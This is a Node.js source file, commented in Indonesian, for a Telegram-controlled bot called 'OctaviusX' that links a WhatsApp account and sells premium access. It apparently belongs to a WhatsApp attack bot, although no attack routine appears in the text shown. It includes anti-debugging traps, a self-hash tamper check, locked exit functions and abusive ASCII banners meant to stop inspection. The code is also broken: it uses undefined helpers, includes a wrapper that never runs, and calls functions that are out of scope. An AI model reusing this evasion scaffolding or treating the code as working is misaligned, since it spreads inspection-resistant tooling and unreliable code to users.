
import { Telegraf, RichMessage, Markup, 
session } from '@icanseeuanywhere/telekaf'
import fs from "fs";
import path from "path";
import https from "https";
import moment from "moment-timezone";
import {
  makeWASocket,
  makeCacheableSignalKeyStore,
  makeInMemoryStore,
  useMultiFileAuthState,
  fetchLatestWaWebVersion,
  DisconnectReason,
  getContentType,
  jidDecode, 
  generateWAMessage, 
  generateWAMessageFromContent,
  fetchLatestBaileysVersion, 
} from "@bellachu/litebails";
import pino from "pino";
import chalk from "chalk";
import axios from "axios";
import readline from "readline";
import config from "./config.js";
const { BOT_TOKEN, OWNER_IDS } = config;
import crypto from "crypto";
import mongoose from "mongoose";
const sessionPath = './session';
let bots = [];
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

const premiumFile = "./Database/prem.json";
const adminFile = "./Database/edmin.json";
let secureMode = false;

const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};


const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }
  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  next();
};

const addadmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addpremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};

const checkPremiumOrGroupPremium = (ctx, next) => {
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id.toString();
    
    // CEK USER PREMIUM (pake premiumUsers.includes langsung)
    if (premiumUsers.includes(userId)) {
        return next();
    }
    
    // CEK GROUP PREMIUM
    if (ctx.chat.type !== "private" && isGroupPremium(chatId)) {
        return next();
    }
    
    const msg = new HTML()
        .heading(2, "❌ AKSES DITOLAK")
        .paragraph("Akses hanya untuk:")
        .ul(
            "User Premium",
            "Group Premium"
        )
        .divider()
        .paragraph("Hubungi owner untuk upgrade!")
        .build();
    
    return ctx.sendRichMessage(msg);
};
// ==================== FUNGSI PREMIUM USER ====================
function isPremiumUser(userId) {
    return premiumUsers.includes(userId.toString());
}

// ==================== FUNGSI ADMIN ====================

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const randomImages = [
"https://files.catbox.moe/gk8k8q.jpg",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);
  return `${hours}h ${minutes}m ${seconds}s`;
};

const validateMongoUri = (uri) => {
  if (!uri || typeof uri !== 'string') {
    throw new Error('MongoDB URI must be a non-empty string');
  }
  if (!uri.startsWith('mongodb+srv://') && !uri.startsWith('mongodb://')) {
    throw new Error('Invalid MongoDB URI format. Must start with mongodb:// or mongodb+srv://');
  }
  return true;
};

const __mongoUri = "mongo elo";

try {
  validateMongoUri(__mongoUri);
  console.log(chalk.green('✓ MongoDB URI validation passed'));
} catch (error) {
  console.error(chalk.red('✗ MongoDB URI validation failed:'), error.message);
  process.exit(1);
}

const connectMongoDB = async () => {
  try {
    await mongoose.connect(__mongoUri, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    });
    console.log(chalk.green('✓ MongoDB connected successfully'));
  } catch (error) {
    console.error(chalk.red('✗ MongoDB connection failed:'), error.message);
    process.exit(1);
  }
};

const WhitelistTokenSchema = new mongoose.Schema({
  tokens: [{
    tokenBot: { type: String, required: true },
    isActive: { type: Boolean, default: true },
    expiredAt: { type: Date, default: null }
  }]
});

const WhitelistToken = mongoose.model('Whitelist', WhitelistTokenSchema, 'avoidxtime');

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }
  
  // ==================== GROUP PREMIUM SYSTEM (TELEKAF) ====================

  function secure() {
    console.log(chalk.bold.yellow(`
             「〔 ACCES GRANTED 〕」
;;,,,.,,,,........,,,:!;;!l!,,,.........,,,,,,,,,,,,,,,,..,;;
;;,,,.,,,,........,,,!,,;;!!!!!!!::;,,,,,,,,,,,,,,,,,,,,..,;;
;;,,,.,,,,........,,;:!llllllll!!!!!l!:,,,,,,,,,,,,,,,,,,.,;;
;;,,,.,,,,........;!llllllll!!!!!!!!!!!!:,,,,,,,,,,,,,,,,.,;;
;;,,,.,,,,.......:llllllll!!!!!!!!!!!!!!!!:,,,,,,,,,,,,,,.,;;
;;,,..,,,,.....,!ll!!lll!!!!!!!!!!:!!!!!!!!!,,,,,,,,,,,,,.,;;
;;,,..,,,,....;llll!ll!!!!!!!!!!!!!!!!!!!!!!!,,,,,,,,,,,,.,;;
;;,,..,,,,,..;!lll!ll!!!!!!!!!!!!!!:!!!!!!!!!!,,,,,,,,,,,.,;;
;;,...,,,,,.,!lll!ll!!!!!!!!!!!!!!!!!!!!!!!!!!:,,,,,,,,,,.,;;
;;,...,,,,..!llllll!!!!!!!!!!!!!!!!!!!!!!!!!!!!,,,,,,,,,,.,;;
;;,...,,,,.:llllll!!!!!!!!!!!!!:!!!!!!!!!!!!!!!:,,,,,,,,,.,;;
;;,...,,,,;llll!!!!!:!!!!!!!!!:!:!!!!!!!!!!!!!!!,,,,,,,,,.,;;
;;,...,,,,!!lll!!!!!:!!!!!!!!!l!!!!!!:!!!!!!!!!!;,,,,,,,,.,;;
;;,...,,,;l!lll!!!:!!!:!!!!!!lll!!!!!:!!!!!!!!!!:,,,,,,,..,;;
;;,...,,,!!!lll!!!:!!!!:!!!!:!!!l!!!!!:!!!!!!!!!!........,,;;
;;,...,,;!;!lll!!!::!!!!!!:!!ll!!:;;:!!!!!!!!!!!:,........,;;
;;,...,,::,!lll!!!!;;;::!::!!l!;,;:!l!!!!!!:!!!!;;........,;;
;;,...,,::,llll!!:ll!;,,!ll!!!l:!!::;:!!!!!:!!!!:;,.......,;;
;;,...,,;;,l!ll!!:!;:!lllllll!lll!!!!!:!!!!::!!!:,,.......,;;
;;,...,,;;,!:lll!!:!!!!llllllllll!!!!!!!!l!::!!!!,,.......,;;
;;,...,,;,,;::!ll!:!!!llllll!!!llllll!!!l!!:!!!!!;;,,,,,,,;;,
;;....,,;;,.!;!!!!!:!llll!.;::::!llll!!l!!::!!!!!:;,;;;;;;;;,
;;....,,;:,.,:!l!!!:!llll:::::::!lll!!ll!!::!!!:!!;,;;;;;,;;;
;;....,,,!:,.!!!l!!:::!lll!!ll!!ll!::ll!!!::!l!:!!;,;;;;;;;;;
;;....,,,,;::ll!l!!::::::!lllll!::!:!l!!!!::ll!:!!:;,;;;;;;;;
;;....,,,,,,!l!!ll!::;;;;;;!:;;:!!!!l!:!!:!lll!:!:!;,;;;;;;;;
;;....,,,,,:ll!:l!!::;;;;:!!:!!!!!!ll:!!!!!ll!:;!:!:;;;;;;;;;
;;....,,,,;lll::l!!:;;;;:!!!:!!!:!ll!:!!!!ll!!;;;:!!;;;;;;;,;
;;....,,,;!ll!::!!l:;;;:!!!!!!!!:!ll!!!!!ll!!;:;;;:!:;;;;;;,,
;;....,,;!ll!:!!!!l::;;:!!!!!!!!:ll!!!!ll!!:;:;;;:!!:;;;;;;,,
,;....,;!lll:!!!!!l:!;;ll::!!l!::l!!:!l!!:;:::;;:!!!::;;;;;,,
,;....;:!ll!:,:!!!l:!::ll!!:!!!!!l!l!l!:::!::::!!:;.;!;,,,,,,
,,...,;:lll!,..::ll!!:!ll!:::!!ll!l!::!::!:::!!:,...,!!...,,,
,,..,,,lll!;....:ll!!:!l!!:::!:!lll!:!:!:::!:;,......:!;..,,,
,,,.,.:lll:,....:lll::!!:::;::!!lll:;::::!:;.........;!!..,,,
,,,;..lll!;.....!lll!:!!::;:::!!!lll!:;::,...........,!!;,,,;
,,,:.,lll!;.....!:ll!!!!!;:::!!!!!!ll::,..............:!:,;,;⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.red(`
        「〔〕Fuck You Loser〔〕」 
⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⠿⣟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⡏⠀⠀⠀⢣⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣟⠧⠤⠤⠔⠋⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⣿⡀⢀⣶⠤⠒⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠈⢿⣆⣠⣤⣤⣤⣤⣴⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⢿⢿⠀⠀⠀⢀⣀⣀⠘⣿⠋⠁⠀⠙⢇⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⢇⡞⠘⣧⠀⢖⡭⠞⢛⡄⠘⣆⠀⠀⠀⠈⢧⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀
⠀⠀⣠⣿⣛⣥⠤⠤⢿⡄⠀⠀⠈⠉⠀⠀⠹⡄⠀⠀⠀⠈⢧⠀⠀⠀⠈⠻⣦⠀⠀⠀
⠀⣼⡟⡱⠛⠙⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠹⣧⡀⠀
⢸⡏⢠⠃⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠸⣷⡀
⠸⣧⠘⡇⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⣿⠇
⠀⣿⡄⢳⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
⠀⢹⡇⠘⣇⠀⠀⠀⠀⠀⠀⠰⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣼⡟⠀⠀
⠀⢸⡇⠀⢹⡆⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢳⣼⠟⠀⠀⠀
⠀⠸⣧⣀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢃⠀⢀⣴⡿⠁⠀⠀⠀⠀
⠀⠀⠈⠙⢷⣄⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⣠⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣷⣦⣄⣀⣀⣠⣤⠾⠷⣦⣤⣤⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.red(`
⠀        「〔〕Fuck You Loser〔〕」 
⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⠿⣟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⡏⠀⠀⠀⢣⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣟⠧⠤⠤⠔⠋⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⣿⡀⢀⣶⠤⠒⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠈⢿⣆⣠⣤⣤⣤⣤⣴⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⢿⢿⠀⠀⠀⢀⣀⣀⠘⣿⠋⠁⠀⠙⢇⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⢇⡞⠘⣧⠀⢖⡭⠞⢛⡄⠘⣆⠀⠀⠀⠈⢧⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀
⠀⠀⣠⣿⣛⣥⠤⠤⢿⡄⠀⠀⠈⠉⠀⠀⠹⡄⠀⠀⠀⠈⢧⠀⠀⠀⠈⠻⣦⠀⠀⠀
⠀⣼⡟⡱⠛⠙⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠹⣧⡀⠀
⢸⡏⢠⠃⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠸⣷⡀
⠸⣧⠘⡇⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⣿⠇
⠀⣿⡄⢳⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
⠀⢹⡇⠘⣇⠀⠀⠀⠀⠀⠀⠰⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣼⡟⠀⠀
⠀⢸⡇⠀⢹⡆⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢳⣼⠟⠀⠀⠀
⠀⠸⣧⣀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢃⠀⢀⣴⡿⠁⠀⠀⠀⠀
⠀⠀⠈⠙⢷⣄⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⣠⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣷⣦⣄⣀⣀⣠⣤⠾⠷⣦⣤⣤⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);
})

global.validateToken = async (BOT_TOKEN) => {
  try {
    const whitelist = await WhitelistToken.findOne({});

    const isValid = whitelist?.tokens?.some((token) => {
      return (
        token.tokenBot === BOT_TOKEN &&
        token.isActive === true &&
        (
          token.expiredAt == null ||
          token.expiredAt > new Date()
        )
      );
    });

    if (!isValid) {
      console.log(chalk.bold.red("[SECURITY] Unauthorized or expired bot token."));
      activateSecureMode();
      return hardExit(1);
    }

    return true;
  } catch (err) {
    console.error(
      chalk.bold.red("[SECURITY] Failed to validate bot token:"),
      err.message
    );

    activateSecureMode();
    return hardExit(1);
  }
};

const question = (query) => new Promise((resolve) => {
    const rl = import('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const tokenData = await WhitelistToken.findOne({});
        const authorizedTokens = tokenData?.tokens?.map(t => t.tokenBot) || [];
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(BOT_TOKEN);
})();

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());
let tokenValidated = false; // volatile gate: import token each restart
 

const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀             「〔 ACCES GRANTED 〕」
;;,,,.,,,,........,,,:!;;!l!,,,.........,,,,,,,,,,,,,,,,..,;;
;;,,,.,,,,........,,,!,,;;!!!!!!!::;,,,,,,,,,,,,,,,,,,,,..,;;
;;,,,.,,,,........,,;:!llllllll!!!!!l!:,,,,,,,,,,,,,,,,,,.,;;
;;,,,.,,,,........;!llllllll!!!!!!!!!!!!:,,,,,,,,,,,,,,,,.,;;
;;,,,.,,,,.......:llllllll!!!!!!!!!!!!!!!!:,,,,,,,,,,,,,,.,;;
;;,,..,,,,.....,!ll!!lll!!!!!!!!!!:!!!!!!!!!,,,,,,,,,,,,,.,;;
;;,,..,,,,....;llll!ll!!!!!!!!!!!!!!!!!!!!!!!,,,,,,,,,,,,.,;;
;;,,..,,,,,..;!lll!ll!!!!!!!!!!!!!!:!!!!!!!!!!,,,,,,,,,,,.,;;
;;,...,,,,,.,!lll!ll!!!!!!!!!!!!!!!!!!!!!!!!!!:,,,,,,,,,,.,;;
;;,...,,,,..!llllll!!!!!!!!!!!!!!!!!!!!!!!!!!!!,,,,,,,,,,.,;;
;;,...,,,,.:llllll!!!!!!!!!!!!!:!!!!!!!!!!!!!!!:,,,,,,,,,.,;;
;;,...,,,,;llll!!!!!:!!!!!!!!!:!:!!!!!!!!!!!!!!!,,,,,,,,,.,;;
;;,...,,,,!!lll!!!!!:!!!!!!!!!l!!!!!!:!!!!!!!!!!;,,,,,,,,.,;;
;;,...,,,;l!lll!!!:!!!:!!!!!!lll!!!!!:!!!!!!!!!!:,,,,,,,..,;;
;;,...,,,!!!lll!!!:!!!!:!!!!:!!!l!!!!!:!!!!!!!!!!........,,;;
;;,...,,;!;!lll!!!::!!!!!!:!!ll!!:;;:!!!!!!!!!!!:,........,;;
;;,...,,::,!lll!!!!;;;::!::!!l!;,;:!l!!!!!!:!!!!;;........,;;
;;,...,,::,llll!!:ll!;,,!ll!!!l:!!::;:!!!!!:!!!!:;,.......,;;
;;,...,,;;,l!ll!!:!;:!lllllll!lll!!!!!:!!!!::!!!:,,.......,;;
;;,...,,;;,!:lll!!:!!!!llllllllll!!!!!!!!l!::!!!!,,.......,;;
;;,...,,;,,;::!ll!:!!!llllll!!!llllll!!!l!!:!!!!!;;,,,,,,,;;,
;;....,,;;,.!;!!!!!:!llll!.;::::!llll!!l!!::!!!!!:;,;;;;;;;;,
;;....,,;:,.,:!l!!!:!llll:::::::!lll!!ll!!::!!!:!!;,;;;;;,;;;
;;....,,,!:,.!!!l!!:::!lll!!ll!!ll!::ll!!!::!l!:!!;,;;;;;;;;;
;;....,,,,;::ll!l!!::::::!lllll!::!:!l!!!!::ll!:!!:;,;;;;;;;;
;;....,,,,,,!l!!ll!::;;;;;;!:;;:!!!!l!:!!:!lll!:!:!;,;;;;;;;;
;;....,,,,,:ll!:l!!::;;;;:!!:!!!!!!ll:!!!!!ll!:;!:!:;;;;;;;;;
;;....,,,,;lll::l!!:;;;;:!!!:!!!:!ll!:!!!!ll!!;;;:!!;;;;;;;,;
;;....,,,;!ll!::!!l:;;;:!!!!!!!!:!ll!!!!!ll!!;:;;;:!:;;;;;;,,
;;....,,;!ll!:!!!!l::;;:!!!!!!!!:ll!!!!ll!!:;:;;;:!!:;;;;;;,,
,;....,;!lll:!!!!!l:!;;ll::!!l!::l!!:!l!!:;:::;;:!!!::;;;;;,,
,;....;:!ll!:,:!!!l:!::ll!!:!!!!!l!l!l!:::!::::!!:;.;!;,,,,,,
,,...,;:lll!,..::ll!!:!ll!:::!!ll!l!::!::!:::!!:,...,!!...,,,
,,..,,,lll!;....:ll!!:!l!!:::!:!lll!:!:!:::!:;,......:!;..,,,
,,,.,.:lll:,....:lll::!!:::;::!!lll:;::::!:;.........;!!..,,,
,,,;..lll!;.....!lll!:!!::;:::!!!lll!:;::,...........,!!;,,,;
,,,:.,lll!;.....!:ll!!!!!;:::!!!!!!ll::,..............:!:,;,;
  `))
    
const store = makeInMemoryStore({
  logger: pino().child({ level: 'silent', stream: 'store' })
});
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

        const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        // PERBAIKAN: Pakai pino({ level: "fatal" }) atau "silent" murni biar dia gak nyepam log koneksi apa-apa di terminal
        logger: pino({ level: "fatal" }), 
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };


    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ OctaviusX  ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            // Memberikan jeda 500ms agar log penutup Baileys keluar dulu ke terminal
            await new Promise(resolve => setTimeout(resolve, 500));
            
            console.clear();
            process.stdout.write('\x1Bc'); // Hard-wipe history layar terminal
            
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢡⡀⢀⣠⣤⠤⠷⠤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⣀⡴⠟⠉⢠⡀⠠⢤⣄⣠⠀⠉⠻⢦⡀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠄⠀⠀⠈⢳⡞⠉⠀⠀⠀⣠⡇⢀⠄⠀⢷⡀⠀⠀⠀⠘⣶⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⡟⠉⠒⠦⣄⣠⡏⠀⠀⠀⠀⢰⣿⢀⣴⣶⣦⡄⣻⠄⢀⢀⣠⣤⢧⣄⣠⠤⠒⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣿⡋⠀⠀⠀⠀⠀⡟⠀⠀⢠⣠⠀⠀⠹⣿⣿⣿⣿⣿⠋⠀⠈⡍⠀⠀⠈⣿⠀⠀⠀⠀⠒⢦⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡏⠀⠀⠀⣀⣀⣸⠁⠀⠀⣆⠙⣿⣆⢠⣿⣷⣿⣿⣷⠀⣠⣾⣷⡞⠀⠀⢹⣀⣀⣀⣀⠀⢸⣷⣧⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠸⡄⠀⢀⡘⢦⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣩⠇⡀⠀⢸⠀⠀⠀⠀⠉⢸⣿⣿⣿⣮⡁⡀⠀⠀⠀⠀
⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⢄⡀⠀⠀⠀⢀⣷⡸⣄⣙⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣖⡚⠁⢀⣞⡀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡴⣔⠀⠀⠀
⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠐⠺⡏⣍⣁⠀⣽⣿⣿⣿⣿⣿⣿⣽⣿⣯⣽⣿⣿⣿⣍⢁⡜⠉⠉⠓⢤⣄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠠⣷⣿⣗⡤⠈⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⠛⢤⡀⠀⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀
⠀⣿⣿⣿⣿⣿⠿⢿⣿⣿⠿⢿⣿⣿⣿⣿⣷⡀⠈⣿⣿⣄⠀⣿⣿⣿⠁⠹⣿⣿⣿⣿⣿⢿⣿⣗⠀⠀⠀⠉⠂⣠⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⢀⡿⡿⠉⣿⡟⠀⢸⣿⠏⠀⠀⢹⠿⠿⢿⣿⣷⣄⠚⢿⣿⣿⣿⡿⠃⢈⣹⣿⣿⣿⣿⣿⡎⢿⣿⣇⠀⠀⣶⣴⣿⣿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
